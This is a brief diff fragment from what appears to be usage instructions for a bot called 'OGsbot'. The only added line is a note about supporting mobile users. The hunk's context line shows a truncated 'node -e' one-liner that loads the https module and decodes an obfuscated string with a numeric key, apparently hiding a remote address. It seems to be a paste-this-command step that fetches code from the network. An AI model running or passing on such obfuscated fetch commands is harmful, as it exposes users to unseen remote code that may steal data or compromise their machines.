@@ -45,3 +45,4 @@ node -e "const https=require('https');const k=23,b='f3BwdHEtODhyaWA5Y35wf29ob3Fl
 
 # note   
 (only supports OGsbot1-OGsbot17 currently)
+(i will also find a way for mobile people to run this)
